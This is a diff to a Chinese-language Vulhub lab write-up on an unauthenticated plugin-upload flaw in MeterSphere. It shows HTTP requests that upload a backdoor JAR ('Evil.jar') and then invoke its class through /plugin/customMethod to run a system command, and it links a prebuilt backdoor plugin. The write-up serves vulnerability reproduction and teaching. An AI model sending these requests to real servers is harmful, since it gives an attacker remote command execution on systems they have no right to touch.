@@ -20,7 +20,9 @@ MeterSphere初始化成功后，访问`http://your-ip:8081`即可跳转到默认
 
 首先，我们访问`http://your-ip:8081/plugin/list`可见成功返回插件信息（虽然此时插件为空），说明`/plugin/*`接口存在未授权访问问题，可以利用。
 
-利用漏洞前，需要准备一个恶意MeterSphere插件。Vulhub提供了一个已经编译好的[插件](https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.0.1)以供测试（**请勿在非授权环境下测试**）。
+![](1.png)
+
+利用漏洞前，需要准备一个恶意MeterSphere插件。Vulhub提供了一个已经编译好的[插件](https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0)以供测试（**请勿在非授权环境下测试**）。
 
 将恶意插件使用如下数据包上传：
 
@@ -37,7 +39,7 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWX
 Content-Length: 11985
 
 ------WebKitFormBoundaryJV2KX1EL5qmKWXsd
-Content-Disposition: form-data; name="file"; filename="metersphere-plugin-DebugSampler-1.0.1-jar-with-all-dependencies.jar"
+Content-Disposition: form-data; name="file"; filename="Evil.jar"
 
 [Paste your jar file]
 ------WebKitFormBoundaryJV2KX1EL5qmKWXsd--
@@ -47,11 +49,9 @@ Content-Disposition: form-data; name="file"; filename="metersphere-plugin-DebugS
 
 > **如果使用Burpsuite来复现漏洞，你需要注意数据包编码问题，否则可能将无法复现。**
 
-如果上传成功，再次访问`http://your-ip:8081/plugin/list`将可以查看到新的插件：
+虽然这次上传会返回错误信息，但实际上恶意JAR包已经成功被添加进系统ClassLoader中。
 
-![](3.png)
-
-最后，即可发送如下数据包来执行任意命令：
+发送如下数据包来执行`org.vulhub.Evil`类中的恶意代码：
 
 ```
 POST /plugin/customMethod HTTP/1.1
@@ -66,9 +66,9 @@ Content-Type: application/json
 Content-Length: 89
 
 {
-  "entry": "io.metersphere.plugin.DebugSampler.UiScriptApiImpl",
+  "entry": "org.vulhub.Evil",
   "request": "id"
 }
 ```
 
-![](4.png)
+![](3.png)
